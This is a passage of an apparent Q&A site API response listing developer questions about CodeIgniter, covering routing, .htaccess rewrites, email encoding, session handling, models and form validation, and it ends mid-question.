{"total":13987,"page":1,"pagesize":100,"questions":[{"tags":["codeigniter","url-rewriting","routing"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":8,"score":0,"question_id":13298460,"title":"How to delete the name of the controller in the URL with CodeIgniter?","body":"<p>I have urls that all contain /main/ in the url as it is my main controller.\nI'd like to get rid of it.</p>\n\n<p>I understood in the User Guide that the routing class will only re-route my URL, not hide a part of it (it is segment 1 according to their docuementation).\nThus, I've found this:</p>\n\n<pre><code>$route['(:any)'] = \"auth/$1\";\n</code></pre>\n\n<p>But I have 404 errors (That's the only modification I made to routing.php)</p>\n\n<p>I believe I'll have to do it in the .htaccess, but I don't know what should be the syntaxe for that. For now, my .htaccess is this one:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    SetEnv MAGIC_QUOTES 0\n    SetEnv PHP_VER 5\n# For security reasons, Option followsymlinks cannot be overridden.\n#   Options +FollowSymlinks -MultiViews\n    Options +SymLinksIfOwnerMatch -MultiViews\n    RewriteEngine On\n    DirectoryIndex index.php\n\n    #Removes access to the system folder by users.\n    #Additionally this will allow you to create a System.php controller,\n    #previously this would not have been possible.\n    #'system' can be replaced if you have renamed your system folder.\n    RewriteCond %{REQUEST_URI} ^system.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #When your application folder isn't in the system folder\n    #This snippet prevents user access to the application folder\n    #Submitted by: Fabdrol\n    #Rename 'application' to your applications folder name.\n    RewriteCond %{REQUEST_URI} ^application.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #Checks to see if the user is attempting to access a valid file,\n    #such as an image or css document, if this isn't true it sends the\n    #request to index.php\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteCond $1 !^(index\\.php|images|robots\\.txt|css)\n    RewriteRule ^(.*)$ index.php?/$1 [L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n    # If we don't have mod_rewrite installed, all 404's\n    # can be sent to index.php, and everything works as normal.\n    # Submitted by: ElliotHaughin\n\n    ErrorDocument 404 /index.php\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>I am using several controllers and my links are similar to this one :</p>\n\n\n\n<p>Thanks </p>\n"},{"tags":["php","codeigniter","email"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":4,"score":0,"question_id":13298363,"title":"Multi functional email set up with Code igniter","body":"<p>I have an application built in CodeIgniter. I needed some help with the following  email related tasks. Please note all emails will require SSL.</p>\n\n<p>1) Send email to congratulate and welcome the user to the site\n2) Send an email to confirm a user account has been deleted should they choose to leave.\n3) Send an email to alert the user for a request sent to them from another user. \n4) Set up and send an email for \"forgot username\" and last but not not least\n5) Send an email to reset password in case the user can't remember how to login. </p>\n\n<p>Thanks for your help, appreciate it.</p>\n"},{"tags":["codeigniter","autoload"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13296886,"title":"Autoload controller in CodeIgniter","body":"<p>I have question to you. \nI try add to my page calendar and some events in this calendar. I know how I can load calendar in page, but I didn`t now how I can load this calendar on every page automatically. </p>\n\n<p>Controller: </p>\n\n<pre><code>&lt;?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Calendar extends CI_Controller {\n\n    function index()\n    {\n        $data = array(\n                3  =&gt; 'Polska - Anglia',\n        );\n\n        $this-&gt;load-&gt;library('calendar');\n\n        $vars['calendar'] = $this-&gt;calendar-&gt;generate('', '', $data);\n\n        $this-&gt;load-&gt;view('main/calendar', $vars);\n    }\n}\n</code></pre>\n\n<p>and In view I call:</p>\n\n<pre><code>&lt;?php echo $calendar;?&gt;\n</code></pre>\n\n<p>I use CodeIgniter 2.1.3 </p>\n"},{"tags":["php","codeigniter","pyrocms"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13291073,"title":"Modifying the number of default chunks in the Page Module for PyroCMS","body":"<p>I want to have 2 default chunks instead of 1 when making a new page.</p>\n\n<p>The reason is, my main template is split into 2 sections and I want to start with 2 chunks.</p>\n\n<p>What I would like to do is edit the page module so that whenever a user creates a new page they will always start with 2 chunks that I have named and defined.</p>\n\n<p>What would I have to modify in order to achieve this?</p>\n\n<p>Note: I already modified the page module and database to add some custom fields. I assume this is the same deal but I can't find where the initial chunk is being created...</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13296390,"title":"Running database function in controller..how do I transfer to Model?","body":"<p>Okay, I have a function in my controller that works. However, I shouldn't be calling the database in the controller (as we all know). I normally can easily migrate information from a model into a controller, but I'm having a hard time with this one. I won't even share my model version...how would you write this to a model?</p>\n\n<pre><code>    $this -&gt; db -&gt; select('title, price, number_sites, number_entries, white_label'); \n    $query = $this -&gt; db -&gt; get('pricing', 3); // limit 3 rows\n\n    $row1 = $query-&gt;row(0); // 0 grabs first row in table: Package 1        \n    $data['row1'] = $row1;\n\n    $row2 = $query-&gt;row(1); // 1 grabs second row in table: Package 2        \n    $data['row2'] = $row2;\n\n    $row3 = $query-&gt;row(2); // 2 grabs third row in table: Package 3        \n    $data['row3'] = $row3;\n</code></pre>\n"},{"tags":["php","jquery","codeigniter","jquery-plugins"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":13296441,"title":"Jquery NOTY not working on a Codeigniter installation","body":"<p>I have a site ran on Codeigniter, and am trying to display a noty notification on form success.</p>\n\n<p>It consists of:</p>\n\n<ul>\n<li>a controller which calls a library site_message() method (saves message and type in flashdata)</li>\n<li>a library which contains the site_message() and add_site_message() methods.  The add_site_message() method is what actually inserts the noty initialization into the head of the HTML document.</li>\n<li>a template library for codeigniter:  <a href=\"http://williamsconcepts.com/ci/codeigniter/libraries/template/reference.html\" rel=\"nofollow\">Template</a></li>\n<li>various views that make up the finished template.</li>\n</ul>\n\n<p>Controller:</p>\n\n<pre><code>$this-&gt;general-&gt;site_message('Article created.', 'success', 'admin/news');\n</code></pre>\n\n<p>\"General\" library:</p>\n\n<pre><code>function site_message($message, $type='error', $redirect_location=false)\n{\n\n    switch ($type)\n    {\n        case 'error':\n            $this-&gt;CI-&gt;session-&gt;set_flashdata('site_error_message', $message);\n            break;\n        case 'success':\n            $this-&gt;CI-&gt;session-&gt;set_flashdata('site_success_message', $message);\n            break;\n        case 'alert':\n            $this-&gt;CI-&gt;session-&gt;set_flashdata('site_alert_message', $message);\n            break;\n        case 'warning':\n            $this-&gt;CI-&gt;session-&gt;set_flashdata('site_warning_message', $message);\n            break;\n        case 'info':\n            $this-&gt;CI-&gt;session-&gt;set_flashdata('site_info_message', $message);\n            break;\n        case 'confirm':\n            $this-&gt;CI-&gt;session-&gt;set_flashdata('site_confirm_message', $message);\n            break;\n    }\n\n    if ($redirect_location) redirect($redirect_location);\n\n}\n\nfunction add_site_message()\n{\n    if ($this-&gt;CI-&gt;session-&gt;flashdata('site_error_message') !== false)\n    {\n        $this-&gt;CI-&gt;template-&gt;add_js(\"\n            $(function() {\n                var noty = noty({\n                    text: '\".addslashes($this-&gt;CI-&gt;session-&gt;flashdata('site_error_message')).\"',\n                    type: 'error',\n                    layout: 'top',\n                    dismissQueue: false,\n                    timeout: 2000\n                });\n                return false;\n            });\n            \", 'embed');\n    }\n    if ($this-&gt;CI-&gt;session-&gt;flashdata('site_success_message') !== false)\n    {\n        $this-&gt;CI-&gt;template-&gt;add_js(\"\n            $(function() {\n                var noty = noty({\n                    text: '\".addslashes($this-&gt;CI-&gt;session-&gt;flashdata('site_success_message')).\"',\n                    type: 'success',\n                    layout: 'top',\n                    timeout: 2000\n                });\n                return false;\n            });\n            \", 'embed');\n    }\n    if ($this-&gt;CI-&gt;session-&gt;flashdata('site_alert_message') !== false)\n    {\n        $this-&gt;CI-&gt;template-&gt;add_js(\"\n            $(function() {\n                var noty = noty({\n                    text: '\".addslashes($this-&gt;CI-&gt;session-&gt;flashdata('site_alert_message')).\"',\n                    type: 'alert',\n                    layout: 'top',\n                    dismissQueue: false,\n                    timeout: 2000\n                });\n                return false;\n            });\n            \", 'embed');\n    }\n    if ($this-&gt;CI-&gt;session-&gt;flashdata('site_warning_message') !== false)\n    {\n        $this-&gt;CI-&gt;template-&gt;add_js(\"\n            $(function() {\n                var noty = noty({\n                    text: '\".addslashes($this-&gt;CI-&gt;session-&gt;flashdata('site_warning_message')).\"',\n                    type: 'warning',\n                    layout: 'top',\n                    dismissQueue: false,\n                    timeout: 2000\n                });\n                return false;\n            });\n            \", 'embed');\n    }\n    if ($this-&gt;CI-&gt;session-&gt;flashdata('site_info_message') !== false)\n    {\n        $this-&gt;CI-&gt;template-&gt;add_js(\"\n            $(function() {\n                var noty = noty({\n                    text: '\".addslashes($this-&gt;CI-&gt;session-&gt;flashdata('site_info_message')).\"',\n                    type: 'information',\n                    layout: 'top',\n                    dismissQueue: false,\n                    timeout: 2000\n                });\n                return false;\n            });\n            \", 'embed');\n    }\n    if ($this-&gt;CI-&gt;session-&gt;flashdata('site_confirm_message') !== false)\n    {\n        $this-&gt;CI-&gt;template-&gt;add_js(\"\n            $(function() {\n                var noty = noty({\n                    text: '\".addslashes($this-&gt;CI-&gt;session-&gt;flashdata('site_confirm_message')).\"',\n                    type: 'confirm',\n                    layout: 'top',\n                    dismissQueue: false,\n                    timeout: 2000\n                });\n                return false;\n            });\n            \", 'embed');\n    }\n}\n</code></pre>\n\n<p>Template (code that implements noty is put RIGHT into the template itself, no dependent views):</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');?&gt;\n\n&lt;!DOCTYPE HTML&gt;\n\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Admin&lt;/title&gt;\n    &lt;!-- CSS --&gt;\n    &lt;noscript&gt;\n        &lt;!-- 5grid core --&gt;\n        &lt;link rel=\"stylesheet\" href=\"&lt;?=config_item('css');?&gt;admin/5grid/core.css\" /&gt;\n        &lt;link rel=\"stylesheet\" href=\"&lt;?=config_item('css');?&gt;admin/5grid/core-desktop.css\" /&gt;\n        &lt;link rel=\"stylesheet\" href=\"&lt;?=config_item('css');?&gt;admin/5grid/style-1000px.css.css\" /&gt;\n        &lt;link rel=\"stylesheet\" href=\"&lt;?=config_item('css');?&gt;admin/5grid/core-noscript.css\" /&gt;\n        &lt;!-- custom extended --&gt;\n        &lt;link rel=\"stylesheet\" href=\"&lt;?=config_item('css');?&gt;admin/style.css\" /&gt;\n        &lt;link rel=\"stylesheet\" href=\"&lt;?=config_item('css');?&gt;admin/style-desktop.css\" /&gt;\n    &lt;/noscript&gt;\n    &lt;?= $_styles; ?&gt;\n    &lt;!-- END CSS --&gt;\n\n    &lt;!-- SCRIPTS --&gt;\n    &lt;script src=\"&lt;?=config_item('js');?&gt;libs/jquery-1.8.0.min.js\"&gt;&lt;/script&gt;\n    &lt;script src=\"&lt;?=config_item('css');?&gt;admin/5grid/init.js?use=mobile,desktop,1000px\n                &amp;amp;mobileUI=1\n                &amp;amp;mobileUI.theme=none\n                &amp;amp;mobileUI.titleBarHeight=55\n                &amp;amp;mobileUI.openerWidth=75\n                &amp;amp;mobileUI.openerText=&amp;lt;\"&gt;&lt;/script&gt;\n    &lt;script src=\"&lt;?=config_item('widgets');?&gt;noty-master/js/noty/jquery.noty.js\"&gt;&lt;/script&gt;\n    &lt;script src=\"&lt;?=config_item('widgets');?&gt;noty-master/js/noty/layouts/top.js\"&gt;&lt;/script&gt;\n    &lt;script src=\"&lt;?=config_item('widgets');?&gt;noty-master/js/noty/themes/default.js\"&gt;&lt;/script&gt;\n    &lt;?= $_scripts; ?&gt;\n    &lt;!-- END SCRIPTS --&gt;\n    &lt;!--[if gte IE 9]&gt;&lt;link rel=\"stylesheet\" href=\"&lt;?=config_item('css');?&gt;admin/style-ie9n.css\" /&gt;&lt;![endif]--&gt;\n    &lt;!--[if lte IE 9]&gt;&lt;link rel=\"stylesheet\" href=\"&lt;?=config_item('css');?&gt;admin/style-ie9.css\" /&gt;&lt;![endif]--&gt;\n&lt;/head&gt;\n</code></pre>\n\n<p>For the life of me, I can't get noty to run.  I've tested to make sure the methods in the General library work... they do.  If I open the General library -> add_site_message() method and replace this:</p>\n\n<pre><code>if ($this-&gt;CI-&gt;session-&gt;flashdata('site_success_message') !== false)\n    {\n        $this-&gt;CI-&gt;template-&gt;add_js(\"\n            $(function() {\n                var noty = noty({\n                    text: '\".addslashes($this-&gt;CI-&gt;session-&gt;flashdata('site_success_message')).\"',\n                    type: 'success',\n                    layout: 'top',\n                    timeout: 2000\n                });\n                return false;\n            });\n            \", 'embed');\n    }\n</code></pre>\n\n<p>with this:</p>\n\n<pre><code>if ($this-&gt;CI-&gt;session-&gt;flashdata('site_success_message') !== false)\n    {\n        $this-&gt;CI-&gt;template-&gt;add_js(\"\n            $(function() {\n                alert('This works fine... so frustrating!');\n                return false;\n            });\n            \", 'embed');\n    }\n</code></pre>\n\n<p>It works fine.  So I know it's not my General library.  Any ideas?</p>\n"},{"tags":["php","security","codeigniter","xss-prevention"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13291336,"title":"Should I use xss_clean or htmlentities during form refill?","body":"<p>As the title says, I do refill my input like this:</p>\n\n<pre><code>&lt;input type=\"text\" name=\"my_input\" value=\"&lt;?= $this-&gt;input-&gt;post('my_input') ?&gt;\"/&gt;\n</code></pre>\n\n<p>But is that safe? In accordance with CodeIgniter user guide, I can set the second parameter of the <code>$this-&gt;input-&gt;post()</code> to the <code>TRUE</code> and then the input will be filtered trough the <code>xss_clean</code> function, but is it really necessary? Or maybe I should just use <code>htmlentities()</code> function while doing that?</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13295185,"title":"How to secure file, that can be downloaded only by some users in Codeigniter or raw PHP?","body":"<p>I wrote web application that has few access levels / groups (not logged in, worker, manager, admin).</p>\n\n<p>For access control i used something similar to best answer here: </p>\n\n<p><a href=\"http://stackoverflow.com/questions/3819275/what-is-the-best-practice-for-restricting-specific-pages-to-logged-in-users-only\">What is the best practice for restricting specific pages to logged in users only in Codeigniter?</a></p>\n\n<p>Now i have to create download page that allows download only for groups which are allowed for specyfic file. Now i have links displayed only for allowed users, but I think I have to hide real file location somehow, because file URL is remembered by browsers and anyone can download file without any problems after logout.</p>\n"},{"tags":[".htaccess","codeigniter","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":7,"score":0,"question_id":13294640,"title":"Moving codeigniter project to a new hosting provider - .htaccess and index.php","body":"<p>I just moved my functional codeigniter project to a new web hosting provider and am now having challenges removing the index.php from the URL using a standard .htaccess mod-rewrite.  Here is the .htaccess that was working fine:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [L]\n</code></pre>\n\n<p>I found <a href=\"http://stackoverflow.com/questions/5479103/moving-codeigniter-project-to-amazon-ec2-htaccess-and-modrewrite-problems\">this</a> discussion but I do not have root access to the apache server to make the suggested configuration change.</p>\n\n<p>Using the provided .htaccess file above,</p>\n\n<ul>\n<li>Works fine:   <a href=\"http://www.mysite.com/index.php/plans\" rel=\"nofollow\">http://www.mysite.com/index.php/plans</a></li>\n<li>Doesn't work:   <a href=\"http://www.mysite.com/plans\" rel=\"nofollow\">http://www.mysite.com/plans</a></li>\n</ul>\n\n<p>Any suggestions are appreciated.</p>\n"},{"tags":["php","jquery","arrays","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13294718,"title":"using dynamic arrays in web app using php","body":"<p>My website is dependent on unique content provided by the user's input.</p>\n\n<p>So they type in, \"sports,\" they will receive content based on sports.  That is simple enough.  However, once I start adding more keywords to it, it gets a bit more complicated, at least in the way I'm doing it.</p>\n\n<p>I need to start constantly checking whether the user inputted data is an array or not, and manipulate the data different.</p>\n\n<p>I am currently storing the user's selection using Codeigniter's session class, then retrieving and manipulating the data based on its value.</p>\n\n<p>So they submit the form and my JS runs:</p>\n\n<pre><code>$('#topics_form').submit(function() {\n    var topic = document.getElementById('topics_filter').value\n    $.ajax({\n        type: \"POST\",\n        url: 'ajax/update_session_topic',\n        dataType: 'json', \n        data: { topic: topic },\n            success: function(){\n                load_custom_topics()\n            }\n    });\n    return false;\n});\n</code></pre>\n\n<p>Then update_session_topic runs in my AJAX model</p>\n\n<pre><code>public function update_session_topic()\n{\n    if ($this-&gt;session-&gt;userdata('active_topic') == FALSE) \n    {\n        $array['active_topic'] = $this-&gt;input-&gt;post('topic');\n        $this-&gt;session-&gt;set_userdata($array);\n        return true;\n    } else {\n        $this-&gt;page_model-&gt;add_session_topic($this-&gt;input-&gt;post('topic'));\n        return true;\n    }\n}\n</code></pre>\n\n<p>When theres only 1 value, its no big deal. </p>\n\n<p>However, when trying to add a second value...I am forced to check whether its an array or not, or make it one.</p>\n\n<pre><code>    public function add_session_topic($current_filter)\n    {\n        $session = $this-&gt;session-&gt;userdata('active_topic');\n        if (is_array($session) == false)\n        {\n            $session = array($this-&gt;session-&gt;userdata('active_topic'));\n        } \n        foreach ($session as $keyword)\n        {\n            if ($keyword == $current_filter)\n            {\n                return false;\n            }\n        }\n        $session[] = $current_filter;\n        $active['active_topic'] = $session;\n        $this-&gt;session-&gt;set_userdata($active);\n        return true;\n    }\n</code></pre>\n\n<p>This occurs in my views as well. </p>\n\n<p>Its kind of annoying, and I was hoping there was a better way to do this.  Im still new to PHP/codeigniter, so I am open to anything.</p>\n\n<p>Thanks!</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13292445,"title":"Getting number of rows while foreach is running","body":"<p>I'm sending mails using foreach loop for getting recipient info in a codeigniter method of a controller , and, if a mail gets sent, I update recipient status in recipients table to 'sent'. </p>\n\n<p>In another method of the same controller (using the same model), I get number of unsent mails, but if I try to get the number of unsent mails while they are being sent, it waits until foreach loop gets done.</p>\n\n<p>How can I continuously get number of unsent mails, while they are being sent in the foreach loop?</p>\n\n<pre><code>recipients table\n    id int 11\n    recipient_id int 11\n    mail_id int 11\n    sent tinyint 1\n    failed tinyint 1\n\n$recipients = $this-&gt;MMails-&gt;GetRecipients($mail_id);\nforeach($recipients as $recipient) {\n    //send message using swift\n    if($message_sent) {\n        $this-&gt;MMails-&gt;MarkAsSent($recipient_id);//this recipient table gets updated actually, but I can't read the new COUNT value until this loop finished\n    }\n}\n</code></pre>\n\n<p>from the model:</p>\n\n<pre><code> function GetNumOfQueued() {//Get number of queued mails\n    $query = $this-&gt;db-&gt;query(\"SELECT COUNT(id) as num_of_queued\n        FROM recipients \n        WHERE sent = 0\");\n    return $query-&gt;row()-&gt;num_of_queued;\n}//GetNumOfQueued\n\n function MarkAsSent($recipient_id) {//Update mail recipient status to sent\n    $this-&gt;db-&gt;set('sent', 1);\n    $this-&gt;db-&gt;where('id', $recipient_id);\n    $this-&gt;db-&gt;limit(1);\n    $this-&gt;db-&gt;update('recipients');\n\n}//MarkAsSent\n</code></pre>\n\n<p>Simply put, PHP doesn't respond until the loop gets finished, and I can't open any other page in the application while the loop is active.</p>\n\n<p>Settings in my local php.ini is output_buffering = Off</p>\n"},{"tags":["php","codeigniter","email","encoding","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13260284,"title":"Incorrect email encoding with CodeIgniter","body":"<p>Now the data looks like this in the database:</p>\n\n<p><code>Hej [indtaster_navn]&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;I forbindelse med noget på ændring af xxxxxx er der behov for opfølgning på:&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;- xxxx&amp;lt;br&amp;gt;- xxxx&amp;lt;br&amp;gt;- xxxx&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;Jeg vil gerne have en tilbagemelding, når du har set på ovenstående.&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;Venlig hilsen&amp;lt;br/&amp;gt;[behandler_navn]&amp;lt;br/&amp;gt;TestGuy&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;[lokal_tlf] - lokal&amp;lt;br&amp;gt;00 00 00 00 - telefon&amp;lt;br&amp;gt;[behandler_email]&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;This S&amp;lt;br&amp;gt;Something&amp;lt;br&amp;gt;Transformer 1234&amp;lt;br&amp;gt;3434 BubbleJ&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;​​​​</code></p>\n\n<p>So i have following code when sending a mail, where it's important to notice that i use <code>html_entity_decode</code>:</p>\n\n<pre><code>    $config['mailtype'] = 'html';\n    $config['priority'] = 1;\n    $config['charset'] = 'utf-8';\n    $this-&gt;email-&gt;initialize($config);\n    $this-&gt;email-&gt;from($this-&gt;auth_data-&gt;user_email, $this-&gt;auth_data-&gt;user_firstname . ' ' . $this-&gt;auth_data-&gt;user_lastname);\n    $this-&gt;email-&gt;reply_to($this-&gt;auth_data-&gt;user_email, $this-&gt;auth_data-&gt;user_firstname . ' ' . $this-&gt;auth_data-&gt;user_lastname);\n    $this-&gt;email-&gt;to('test@test.com'); \n    $this-&gt;email-&gt;subject($feedback_title_temp);\n    $this-&gt;email-&gt;message(html_entity_decode($feedback_temp));  \n    $this-&gt;email-&gt;send();\n</code></pre>\n\n<p>When i receive the email it inserts the symbol <code>=</code> random places and in some cases the <code>&lt;br&gt;</code> does not even occur.</p>\n\n<p>For example: </p>\n\n<pre><code>- xxxx&lt;=r&gt;- xxxx\n</code></pre>\n\n<p>Should be:</p>\n\n<pre><code>- xxxx\n- xxxx\n</code></pre>\n\n<p>When i view the email on my smartphone, the encoding problem only seems to occur with the <code>æåø</code> chars while Outlook is a completely different story.</p>\n\n<p>Received email header::</p>\n\n<pre><code>**Microsoft Mail Internet Headers Version 2.0\nSubject: =?utf-8?Q?(ID:_418)?=\nTo: some@one.com\nX-PHP-Originating-Script: 0:Email.php\nUser-Agent: CodeIgniter\nDate: Wed, 7 Nov 2012 00:31:54 +0100\nFrom: &lt;mat@damn.com&gt;\nReturn-Path: &lt;mat@damn.com&gt;\nReply-To: \"Johnny Bravo\" &lt;mat@damn.com&gt;\nX-Sender: damn@test.com\nX-Mailer: CodeIgniter\nX-Priority: 1 (Highest)\nMessage-ID: &lt;50999deab797d@test.com&gt;\nMime-Version: 1.0\nContent-Type: multipart/alternative; boundary=\"B_ALT_50999deab798e\"\nX-OriginalArrivalTime: 06 Nov 2012 23:31:54.0823 (UTC) FILETIME=[E8022570:01CDBC76]\n\n--B_ALT_50999deab798e\nContent-Type: text/plain; charset=utf-8\nContent-Transfer-Encoding: 8bit\n\n--B_ALT_50999deab798e\nContent-Type: text/html; charset=utf-8\nContent-Transfer-Encoding: quoted-printable\n\n\n--B_ALT_50999deab798e--\n**\n</code></pre>\n\n<p>Received mail, based on different content, but the errors are very obvious:</p>\n\n<pre><code>Det her er en m=sse tekst, det er bare en test fra en hæææst.\n\n\n- Hehe\n- Heh&lt;=br&gt;\n- Wee\n\n\nA=l these things\n\n- Lots of text\n</code></pre>\n"},{"tags":["php","string","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13294292,"title":"CodeIgniter: Is there a string contains function?","body":"<p>Form on Page:  </p>\n\n<pre><code>&lt;div&gt;\n&lt;?php echo form_open('add/player');\n    echo form_label('First Name','playerFirstName');\n    echo form_input('playerFirstName','test');\n    echo \"&lt;br /&gt;\";\n    echo form_label('Last Name','playerLastName');\n    echo form_input('playerLastName','test');\n    echo \"&lt;br /&gt;\";\n    echo form_submit('addPlayer','Add Player');\n    echo form_close(); ?&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>Called Controller:</p>\n\n<pre><code>class Add extends CI_Controller\n{\n    public function index()\n    {\n        $this-&gt;load-&gt;view('header');\n        $this-&gt;load-&gt;view('add');\n        $this-&gt;load-&gt;view('footer');\n    }\n\n    public function Player()\n    {\n        if(strtoupper($_SERVER['REQUEST_METHOD']) == 'POST')\n        {\n            if(basename($_SERVER['HTTP_REFERER']) == basename($_SERVER['PHP_SELF']))\n            {\n                $this-&gt;load-&gt;model('players');\n                $returnMessage = $this-&gt;players-&gt;add_player($this-&gt;input-&gt;post('playerFirstName'), $this-&gt;input-post('playerLastName'));\n            }\n        }\n        $this-&gt;load-&gt;view('header');\n        $this-&gt;load-&gt;view('addplayer');\n        $this-&gt;load-&gt;view('footer');\n    }\n}\n</code></pre>\n\n<p>I'm a very green novice when it comes to PHP, CodeIgniter and MySQL (or web coding in general), so if you see any suggestions, please don't hesitate to make them (though the credit will be given to the one who answers my question, not makes my code work the best).  However, as to my question, is there a way to see if a string is within another string?  My <code>$returnMessage</code>, if successful will have the word <code>successfully</code> in it.  What I want to do is <i>if</i> the player is not added, I want to reload the values from the form and put them back.  Here's where it gets tricky.</p>\n\n<p>The names are saved in table <code>people_names</code>.  In the <code>players</code> table, I save the <code>nameid</code> that is associated with that name in the <code>people_names</code> table.  In my <code>add_player</code> function, I check to see if the names are in the table, if they aren't I add them, then I add the player to the <code>players</code> table with the appropriate ids.  Because of this, I'm not sure <code>form_validation</code> would be able to be used or not.  If it were, please let me know.</p>\n\n<p>So what I want to do is check the <code>$returnMessage</code> and if it doesn't contain <code>successfully</code>, then I want to add the values back to the fields.  However, I'm not finding a function where I can see if a string is inside of another string.  I see string compares and substring functions, but no string contains.  Any ideas?  Thanks.</p>\n"},{"tags":["php","mvc","codeigniter"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":1,"view_count":30,"score":1,"question_id":13290689,"title":"Using CodeIgniter Model as an object manager/factory","body":"<p>I'm currently designing a game that utilises CodeIgniter, but I don't think the singleton approach to models is the way I want to handle the game-related objects in the DB.</p>\n\n<p>I want to use a CodeIgniter Model class to handle the basic CRUD operations of the objects, but have the objects as PHP Classes.</p>\n\n<p>Example:</p>\n\n<pre><code> $this-&gt;load-&gt;model('playermodel');\n $player = $this-&gt;playermodel-&gt;get($player_id); // Returns a Player object\n\n // Call modifying operations on the player (equip item, take damage etc.)\n\n $this-&gt;playermodel-&gt;save($player); // Commits updated Player back to DB\n\n $player2 = $this-&gt;playermodel-&gt;create(); // Basically calls new Player()\n</code></pre>\n\n<p>I'm fairly new to CodeIgniter, would something like this be going against any kind of CodeIgniter or MVC design rules? And if so, could anyone recommend me another approach to my problem?</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13293399,"title":"IF Statement In View Not Triggering","body":"<p>So I have this code block in my controller (I know, db stuff should be in model..I'll transfer it over there once working). Searches the database for a \"subscription\" and echos in the view. That works. However, in my view, I want to add an IF statement like the second block of code below - but it's not working. Suggestions? In other words, how would you write the IF statement in the view? Pretty sure the <code>query</code> portion is incorrect...</p>\n\n<pre><code>    // displays current subscription in view\n    $userid = $this -&gt; session -&gt; userdata('user_id');\n\n    $this -&gt; db -&gt; select('subscription');\n    $this -&gt; db -&gt; where ('id', $userid);\n    $query = $this -&gt; db -&gt; get('subscriptions');\n\n    if($query -&gt; result() == TRUE) // if subscription exists for user, display:\n    {\n        foreach ($query-&gt;result() as $row)\n        {\n            $data['packagename'] = $row-&gt;subscription;\n        } \n    } \n</code></pre>\n\n<p>In view:</p>\n\n<pre><code>    &lt;?php if($query -&gt; result() == TRUE) : ?&gt;\n    &lt;? echo $packagename; ?&gt;\n    &lt;?php endif ?&gt;\n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":181,"score":3,"question_id":9346921,"title":"Why does CodeIgniter redirect not remove the hash/pound (#) at the end of the URL?","body":"<p>I am not sure if this is really a CodeIgniter issue or a browser issue. This happens in Chrome, but not Safari. However, I would assume it should not be happening in any browser.</p>\n\n<p>If you go to <strong>example.com/foo#</strong> that contains</p>\n\n<pre><code>redirect('bar');\n</code></pre>\n\n<p>you would expect to end up at <strong>example.com/bar</strong>. Instead, you end up at <strong>example.com/bar#</strong>. I don't understand why the hash does not go away. It makes no sense. What is going on?</p>\n"},{"tags":["regex","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":18,"score":-1,"question_id":13292815,"title":"CodeIgniter validate phone numbers","body":"<p>I have a form in codeigniter and I am looking to validate my phone number field.</p>\n\n<p>This is what I got thus far...</p>\n\n<pre><code>$this-&gt;form_validation-&gt;set_rules('homephone', 'Home Phone', 'required|regex_match[/^[0-9]+$/]|xss_clean');\n</code></pre>\n\n<p>right now my regex_match only allows numbers for that field...I would like to allow (, ), ., -</p>\n\n<p>is this possible?</p>\n"},{"tags":["php","codeigniter","routes","uri"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13291907,"title":"Codeigniter Route Confusion","body":"<p>I am building a URL shortener web site.</p>\n\n<p>Here is my <code>config/routes.php</code> file:</p>\n\n<pre><code>$route['default_controller'] = \"main\";\n$route['404_override'] = '';\n$route['(\\w{2})/(.*)']        = '$2';\n$route['(\\w{2})']             = $route['default_controller'];\n\n$route['join']                = 